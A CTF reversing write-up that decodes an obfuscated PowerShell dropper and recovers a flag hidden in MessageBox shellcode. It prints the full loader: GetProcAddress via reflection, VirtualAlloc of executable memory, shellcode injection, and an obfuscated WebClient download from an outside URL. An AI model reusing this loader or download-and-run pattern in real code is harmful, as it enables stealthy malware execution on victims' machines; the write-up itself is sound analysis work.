---
title: Deloitte CTF Quals 2019: Sea shells, she sails, nooo!
slug: deloitte-sea-shells-she-sails
date: 06/11/2019 06
---

*Why oh why I try again... sea shells she sails, nooo! 🏖️* was a task labelled
reversing and worth 200 points (which was quite a lot for this CTF).

![Task Description](/assets/sea-shells/intro.png)

We are given a plaintext file, that contains what looks like a PowerShell
script:

```powershell
$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("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"));

IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

A variable `s` is declared. At the same time, it is assigned a memory stream,
created from the decoding of a large base64 string.

The `s` stream is then passed to a GZip decoder. The output is also a stream,
that is read.

We could actually run this code in a Windows environment but it is also
totally possible to emulate its behaviour from a *Nix shell, which I did.

Providing that the base64 string is a file called `b64` we have:

```
$ cat b64 | base64 -D | gzip -dc > out
```

Content of `out`:

```powershell
Set-StrictMode -Version 2
$None = @'
function send_postie {
	Param ($name, $address)		
	$postman = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$stamps = $postman.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
	return $stamps.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($postman.GetMethod('GetModuleHandle')).Invoke($null, @($name)))), $address))
}

function get_java {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $java_code,
		[Parameter(Position = 1)] [Type] $java_pcode = [Void]
	)

	$java_class = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$java_class.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $java_code).SetImplementationFlags('Runtime, Managed')
	$java_class.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $java_pcode, $java_code).SetImplementationFlags('Runtime, Managed')

	return $java_class.CreateType()
}

function BxoriT {
	Param (
		[Parameter(Position = 0, Mandatory = $True, HelpMessage="Perhaps you should listen to the shell?")] $key
	)

	-joiN ( ( 103,110,115 ,33 ,41,37 , 121, 33 , 60/B, 33 , 49 , 58, 33 ,37,121 ,33, 44 ,109 ,117 ,33,37 , 67 , 121,110 , 104 , 85 ,47 ,66, 110 ,116,111, 117,58 , 33,37 ,121 ,42 ,42, 40 ,33 , 122,33 ,37, 67,121,110 ,104, 85 , 90 ,37 , 121,92 ,33 , 60, 33, 37 , 67 ,121,110 ,104, 85, 90, 37 , 121 ,92 ,44 ,67 ,121,110 , 83 ,37 , 106 , 100,120,33, 124,58) | fOreaCH-OBJeCt {[Char] ( $_ -bXOr'0x01' ) } )|iNvoKe-eXpReSsIOn
}

[Byte[]]$BxoiT = [System.Convert]::FromBase64String('uEjUuMCEKCgouLhIoc0Z+kyjehi4wy+qs4LQngICo3oko3o8o1oAuCefYg4Z17i4GeiEFElUKgQI6eclKe+4ysZ6f6N6OLijahS4KfijaFCt6Fx9Kfi4eKNgMLijcAgp+8tsYaMco7gp/rgZ1xnouITp5yUp7xDIXdsrVdATVQxd93CjcAwp+7hOoyRjo3A0KfujLKMp+KFsDAy4c3O4SbhxuHJ518i4cLh3uHK4ozrBR9fX17h1uJYuKSgouEJoQCg4KCh+QihAcIx7zdf9oeuh76HZwHEoKCjDLfGhoBJ+wysdwmt2uNqMuMANKCgowyzCFYsQk8g1AiJAjr2Vtdf9FC5UIqjTyF0tk287WkdCKHvX/RnouMMs69bY7nh4eHt4eEAQQCU+1/1wcEnBIykoKMCB19fX8cOz8VwM3Bn6ml8Z4UyjWRijXiSjXjSjbiCjVgijHhBnMF3bcSn518lIo0QMDKNtFKN8AFApwqNiMKNyCCnDyxxhoxyjKcYZ1xno1ISs6Fwv6eclKe/D3BNUDABdyaNyDCnDTqMkY6NyNCnDoyyjKcChbAw0SeuaIAH8oc2h6kCmZibEesC319fXoW0sk1bwyluvNAx6wKbX19ehbSBAREQIaUAbGgZMQF1bTVoY86B0DCKhzn7XfSyh6niTgIpllK80DHrAd9fX10BHUHAIQElPTWpAZU1bWxnzoHQMIqHLQFtwCAhAT1pJXEBrR0ZcGeGgZAwhockZ+np7eXrX+BnoeNd9IPHDs/FcDNwZ+ppfGeFMo1kYo14ko140o24go1YIox4QZzBd23Ep+dfJSKNEDAyjbRSjfABQKcKjYjCjcggpw8scYaMcoynGGdcZ6NSErOhcL+nnJSnvw9wTVAwAXcmjcgwpw06jJGOjcjQpw6MsoynAoWwMNEnrmiAB/KHNoepApmYmxHrAt9fX16FtLJNW8MpbrzQMesCm19fXoW0gQERECGlAGxoGTEBdW01aGPOgdAwioc5+130soep4k4CKZZSvNAx6wHfX19dAR1BwCEBJT01qQGVNW1sZ86B0DCKhy0BYVXAIQHdMWhhABUscRkBoXHcZQBt3XEBAREsYTEBbQBtEQFobbAVAXEQbd0BTZBlcQExLXE4Z4aBkDAKhyRn6ent5etf4Geh4130g')

BxoriT 13
BxoriT 37

$chkErr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((send_postie kernel32.dll VirtualAlloc), (get_java @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
$exCeption = $chkErr.Invoke([IntPtr]::Zero, $BxoiT.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($BxoiT, 0, $exCeption, $BxoiT.length)

$sherrifTax = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($exCeption, (get_java @([IntPtr]) ([Void])))
${W`eBKey} = (.("{0}{1}{2}" -f 'Ne','w-Objec','t') ("{2}{3}{4}{1}{0}" -f 'nt','bClie','Syste','m.Net.W','e')).("{0}{1}{2}{3}" -f 'Downlo','adS','t','ring').Invoke(("{8}{2}{3}{1}{7}{5}{6}{0}{4}{9}" -f'k','is.','tps','://th','ey.h','o','es.nowhere/web','g','ht','tml'))
& ( $Env:COmSpEC[4,26,25]-Join'') ( ( NeW-obJEcT  MAnAgEMeNt.AuToMatioN.PScredENtiaL ' ', ('76492d1116743f0423413b16050a5345MgB8AGUAcwBUAFUAUgBOADYAagA2AGUAbABjAHkAVAB2AHcAZgBpAE0AUQByAHcAPQA9AHwAYwAzADkAOAAyAGEAMQA5ADEAMwBkADUAMAA1ADgAYgBmADkAOAAwADYANABkADcAYwA2ADYAMgA1ADAAYgAyAGQAOQBjAGQAZAA3ADIANAA4AGEAZABmADAANgA5AGMAMgAzADEAOAA5AGMANABmADgAZgA5AGUAOQA4AGQAOQBjADkANgBhADYAOAA2ADUAOAA1ADgANQBhAGEAMwBiADUAMwA0AGUANwBjADMANwAzADAAOQAxAGEAMQA4ADcAYwA0ADgAMABlADAAMgA5ADUAYQA1ADEAYQAxADYAYwA0ADgAYwBjAGEANwBiAGQAOAA3ADIANgA5ADYAZQBmADcAZgBiADEAYgAwADcAOQBmADIAMgAwADMAYgA1ADkAZAAxAGQAOQA0ADQAMwA5ADgAYgBhADIAZgAyAGIANwA='|conVErTTO-secUReStriNg  -ke $webkey) ).geTnEtWoRKcrEDeNTial().PaSSwoRd )
'@

If ([IntPtr]::size -eq 8) { start-job { param($a) IEX $a } -RunAs32 -Argument $None | wait-job | Receive-Job } else { IEX $None }
```

This Powershell script seems to do a lot but is actually quite simple:

* Create a variable named `None` that actually contains another Powershell
  script
* Invoke this script

And regarding the so-called script:

* Define a function `send_postie` (does not look important, let's ignore it)
* Define a function `get_java`, that does some shaddy business (let's ignore it too)
* Define a function `BxoriT` that looks much more interesting (array of bytes, 
  xor...) but also obfuscated (more on that later). This function takes a
  parameter that is called `key`.
* Define a bytes array, called `BxoiT`, from the decoding process of a base64
  string
* Call `BxoriT` with `13` as parameter
* Call `BxoriT` again, with `37` as parameter
* Perform some more obfuscated business (at this point I stoped reading and
  wanted to take a look at `BxoriT` first)

The `BxoriT` function uses
[Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression),
which is some sort of runtime code evaluation. The code it evaluates is the
concatenation of a few hardcoded bytes, each one xored with `0x01`. We can
make a little C program to recover the actual code:

```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

static const uint8_t SOURCE[] = {
  103, 110, 115,  33,  41,  37, 121,  33,  60,  33,  49,  58, 33,
   37, 121,  33,  44, 109, 117,  33,  37,  67, 121, 110, 104, 85,
   47,  66, 110, 116, 111, 117,  58,  33,  37, 121,  42,  42, 40,
   33, 122,  33,  37,  67, 121, 110, 104,  85,  90,  37, 121, 92,
   33,  60,  33,  37,  67, 121, 110, 104,  85,  90,  37, 121, 92,
   44,  67, 121, 110,  83,  37, 106, 100, 120,  33, 124, 58,
};

static const uint8_t KEY = 0x1;

enum { LENGTH = sizeof(SOURCE) / sizeof(uint8_t) };

int main() {
  uint8_t result[LENGTH + 1] = { 0 };

  for (size_t i = 0; i < LENGTH; i++) {
    result[i] = SOURCE[i] ^ KEY;
  }

  printf("%s\n", result);

  return EXIT_SUCCESS;
}
```

*Note: The `enum` allows `LENGTH` to be a compile-time constant expression.
A `#define` could also do the trick. A `static const size_t` would not work
and trigger a warning. Everyone uses Python anyway...*

```
$ clang dec.c -o dec
$ ./dec
for ($x = 0; $x -lt $BxoiT.Count; $x++) { $BxoiT[$x] = $BxoiT[$x]-BxoR$key };
```

So it is a simple for-loop that iterates over `BxoiT` (the byte array created
from the base64) and XOR each byte using the key passed as parameter to
`BxoriT`. I did not get that immediately because of this part of the
expression: `$BxoiT[$x]-BxoR$key`. I thought it was: `$BxoiT[$x] - BxoR$key`,
which does not make any sense as `BxoR` would be an undefined name. If we
remove the misleading casing, we get: `$BxoiT[$x] -Bxor $key`, which makes
much more sense.

In order to emulate the script we need to:

* Decode the base64 used to create `BxoiT` into a byte array
* Xor each byte with `13`
* Xor each byte with `37`

Here is a Python script:

```python
import base64

KEY_1 = 13
KEY_2 = 37

with open("source", "rb") as src_file:
    src = src_file.read()
    decoded = [ord(d) for d in base64.b64decode(src)]

    result = bytearray()
    for d in decoded:
        result.append(d ^ KEY_1 ^ KEY_2)

    with open("destination", "wb") as dest_file:
        dest_file.write(result)
```

The result is written in a file as it contains binary data. Providing that
the base64 is in a file called `source`:

```
$ python script.py
$ cat destination
ê`¸êË¨   êê`âÂ1“dãR0êÎÇõ™¯∂**ãRãRãr(ê∑J&1ˇêê1¿¨<a|, ¡œ
«ê‚ÓRWãRêãB<ê–ã@xÖ¿tU–êPãHêãX ”„DIã4ãê÷ê1ˇ1¿ê¨¡œ
«8‡uÛ}¯;}$uﬂXãX$”êfãKãX”ãã–âD$$ê[[êaêYêZQˇ‡êXê_êZêãÈoˇˇˇê]êæ  êj@h   Vj hX§SÂˇ’â√â«âÒËY   ÎŸâà:VÎ5ÍC^êÚ§êË%   ÎÍ=£8ª‡*
h¶ïΩùˇ’<|
Ä˚‡uªGroj Sˇ’1¿êÎ√˛∆PPPSPPh8h
ˇ’XXaÈ  Ë©ˇˇˇŸÎõŸt$Ù1“≤w1…dãq0ãvãvãFã~ ã68OuÛY—ˇ·`ãl$$ãE<ãT(xÍãJãZ Î„4Iã4ãÓ1ˇ1¿¸¨Ñ¿t¡œ
«ÎÙ;|$(u·ãZ$ÎfãKãZÎããËâD$a√≤)‘âÂâ¬héNÏRËüˇˇˇâEª~ÿ‚sá$RËéˇˇˇâEhll Ah32.dhuser0€à\$
âÊVˇUâ¬Pª®¢Mºá$RË_ˇˇˇhoxX hageBhMess1€à\$
â„hsX  hgrathCont1…àL$	â·1“RSQRˇ–1¿PˇUŸÎõŸt$Ù1“≤w1…dãq0ãvãvãFã~ ã68OuÛY—ˇ·`ãl$$ãE<ãT(xÍãJãZ Î„4Iã4ãÓ1ˇ1¿¸¨Ñ¿t¡œ
«ÎÙ;|$(u·ãZ$ÎfãKãZÎããËâD$a√≤)‘âÂâ¬héNÏRËüˇˇˇâEª~ÿ‚sá$RËéˇˇˇâEhll Ah32.dhuser0€à\$
âÊVˇUâ¬Pª®¢Mºá$RË_ˇˇˇhoxX hageBhMess1€à\$
â„hp}X h_dr0h-c4nh@t_1h3_thhlc0dhsh3lhr3D-htl3_h{L1thdctf1…àL$*â·1“RSQRˇ–1¿PˇU
```

The output mostly looks like garbage. However, at the end we have:

```
p}X h_dr0h-c4nh@t_1h3_thhlc0dhsh3lhr3D-htl3_h{L1thdctf
```

We know the flag format: `dctf{...}` so it really looks like a scrambled flag.
It is actually fragments of four characters, separated by an `h`, and arranged
in the opposite order:

```
p}X h_dr0h-c4nh@t_1h3_thhlc0dhsh3lhr3D-htl3_h{L1thdctf
[p}X ] h [_dr0] h [-c4n] h [@t_1] h [3_th] h [lc0d] h [sh3l] h [r3D-] h [tl3_] h [{L1t] h [dctf]
[p}X ][_dr0][-c4n][@t_1][3_th][lc0d][sh3l][r3D-][tl3_][{L1t][dctf]
[dctf][{L1t][tl3_][r3D-][sh3l][lc0d][3_th][@t_1][-c4n][_dr0][p}X ]
dctf{L1ttl3_r3D-sh3llc0d3_th@t_1-c4n_dr0p}X
dctf{L1ttl3_r3D-sh3llc0d3_th@t_1-c4n_dr0p}
```

Final flag: `dctf{L1ttl3_r3D-sh3llc0d3_th@t_1-c4n_dr0p}`.

A few things learned from this challenge:

* Simple Powershell scripts can most likely be emulated in a *NIX environment
* Do not try to understand code that is not used at the end